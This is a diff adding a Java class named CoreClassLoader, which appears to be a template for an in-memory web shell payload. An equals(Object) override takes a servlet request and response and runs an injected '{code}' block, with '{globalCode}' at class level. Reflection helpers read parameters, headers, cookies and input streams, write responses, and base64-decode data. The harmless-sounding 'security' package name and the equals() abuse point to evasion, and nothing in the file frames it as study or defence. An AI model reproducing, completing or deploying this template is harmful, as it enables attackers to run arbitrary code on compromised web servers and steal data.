@@ -1,0 +1,109 @@
+package com.security;
+import java.io.*;
+import java.net.*;
+import java.util.*;
+import java.lang.reflect.*;
+import javax.crypto.*;
+import javax.crypto.spec.*;
+
+public class CoreClassLoader extends ClassLoader {
+    {globalCode}
+
+    public CoreClassLoader(ClassLoader parent) {
+        super(parent);
+    }
+    
+    public CoreClassLoader() {
+        super(CoreClassLoader.class.getClassLoader());
+    }
+
+    public boolean equals(Object obj) {
+        Object[] context = (Object[]) obj;
+        Object request = context[0];
+        Object response = context[1];
+        {code}
+        return true;
+    }
+
+    public String getParameter(Object request, String key) {
+        try {
+            Method m = request.getClass().getMethod("getParameter", String.class);
+            return (String) m.invoke(request, key);
+        } catch(Exception e) { return null; }
+    }
+
+    public String getHeader(Object request, String key) {
+        try {
+            Method m = request.getClass().getMethod("getHeader", String.class);
+            return (String) m.invoke(request, key);
+        } catch(Exception e) { return null; }
+    }
+    
+    public String getCookie(Object request, String key) {
+        try {
+            Method m = request.getClass().getMethod("getCookies");
+            Object[] cookies = (Object[]) m.invoke(request);
+            if (cookies != null) {
+                for (Object c : cookies) {
+                    Method getName = c.getClass().getMethod("getName");
+                    String name = (String) getName.invoke(c);
+                    if (key.equals(name)) {
+                        Method getValue = c.getClass().getMethod("getValue");
+                        return (String) getValue.invoke(c);
+                    }
+                }
+            }
+        } catch(Exception e) { }
+        return null;
+    }
+    
+    public InputStream getInputStream(Object request) {
+        try {
+            Method m = request.getClass().getMethod("getInputStream");
+            return (InputStream) m.invoke(request);
+        } catch(Exception e) { return null; }
+    }
+    
+    public OutputStream getOutputStream(Object response) {
+        try {
+            Method m = response.getClass().getMethod("getOutputStream");
+            return (OutputStream) m.invoke(response);
+        } catch(Exception e) { return null; }
+    }
+    
+    public void setHeader(Object response, String key, String value) {
+        try {
+            Method m = response.getClass().getMethod("setHeader", String.class, String.class);
+            m.invoke(response, key, value);
+        } catch(Exception e) { }
+    }
+
+    public void addCookie(Object response, String key, String value) {
+        // Placeholder for cookie setting if needed
+    }
+    
+    public void setStatus(Object response, int code) {
+        try {
+            Method m = response.getClass().getMethod("setStatus", int.class);
+            m.invoke(response, code);
+        } catch(Exception e) { }
+    }
+
+    public byte[] base64Decode(byte[] b) {
+        try {
+            Class c = Class.forName("sun.misc.BASE64Decoder");
+            Method m = c.getMethod("decodeBuffer", InputStream.class);
+            return (byte[]) m.invoke(c.newInstance(), new ByteArrayInputStream(b));
+        } catch (Exception e) {
+            try {
+                Class c = Class.forName("java.util.Base64");
+                Method m = c.getMethod("getDecoder");
+                Object decoder = m.invoke(null);
+                Method m2 = decoder.getClass().getMethod("decode", byte[].class);
+                return (byte[]) m2.invoke(decoder, b);
+            } catch (Exception e2) {
+                return null;
+            }
+        }
+    }
+}
